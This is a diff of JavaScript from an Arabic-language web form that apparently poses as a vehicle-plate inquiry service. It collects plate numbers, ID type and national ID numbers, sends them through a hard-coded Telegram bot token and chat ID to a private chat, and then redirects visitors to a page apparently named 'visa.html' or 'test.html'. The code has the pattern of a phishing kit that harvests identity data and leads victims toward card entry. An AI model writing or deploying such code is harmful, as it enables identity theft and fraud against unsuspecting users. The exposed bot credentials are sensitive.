@@ -524,10 +524,10 @@ const plateNumber = document.getElementById("plateNumber").value;
 localStorage.setItem("plateNumber", plateNumber);
 
   function sendToTelegram(data) {
-    const token = "7306405778:AAHuLdC1FiExOFkycDqoTHpd-sUuf6IhF-c"; // ← ضع هنا التوكن الخاص بك
-    const chat_id = "7595871538"; // ← ضع هنا chat_id الخاص بك
+  const token = "7306405778:AAHuLdC1FiExOFkycDqoTHpd-sUuf6IhF-c"; 
+  const chat_id = "7595871538";
 
-    const message = `
+  const message = `
 🚗 استعلام جديد:
 
 🔠 رمز اللوحة: ${data.plateText}
@@ -536,50 +536,53 @@ localStorage.setItem("plateNumber", plateNumber);
 🧾 رقم الهوية: ${data.idNumber}
 `;
 
-    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
-    fetch(url, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        chat_id: chat_id,
-        text: message,
-      })
+  fetch(url, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      chat_id: chat_id,
+      text: message,
     })
-    .then(response => response.json())
-    .then(data => {
-window.location.href = "visa.html"; // ← عدل الرابط للصفحة التي تريد تحويل المستخدم إليها
-    })
-    .catch(error => {
-      alert("❌ فشل الإرسال إلى تليجرام");
-      console.error(error);
-    });
+  })
+  .then(response => {
+    // هنا نخزن البيانات المدخلة، مو الرد
+    localStorage.setItem("formData", JSON.stringify(data));
+    window.location.href = "test.html";  // أو test.html لو هذه الصفحة المطلوبة
+  })
+  .catch(error => {
+    alert("❌ فشل الإرسال إلى تليجرام");
+    console.error(error);
+  });
+}
+
+function handleFormSubmit(event) {
+  event.preventDefault();
+
+  const userInput = document.getElementById('captchaInput').value;
+  if (userInput !== captchaCode) {
+    alert('رمز التحقق غير صحيح. حاول مرة أخرى.');
+    generateCaptcha();
+    return false;
   }
 
-  function handleFormSubmit(event) {
-    event.preventDefault();
+  const formData = {
+    plateText: document.getElementById('plateText').value,
+    plateNumber: document.getElementById('plateNumber').value,
+    idType: document.getElementById('idType').options[document.getElementById('idType').selectedIndex].text,
+    idNumber: document.getElementById('idNumber').value
+  };
 
-    const userInput = document.getElementById('captchaInput').value;
+  // ترسل البيانات إلى تليجرام وبعدها تخزن وتنتقل
+  sendToTelegram(formData);
 
-    if (userInput !== captchaCode) {
-      alert('رمز التحقق غير صحيح. حاول مرة أخرى.');
-      generateCaptcha();
-      return false;
-    }
+  return false;
+}
 
-    const formData = {
-      plateText: document.getElementById('plateText').value,
-      plateNumber: document.getElementById('plateNumber').value,
-      idType: document.getElementById('idType').options[document.getElementById('idType').selectedIndex].text,
-      idNumber: document.getElementById('idNumber').value
-    };
 
-    sendToTelegram(formData);
-
-    return true;
-  }
 
   window.onload = generateCaptcha;
 </script>
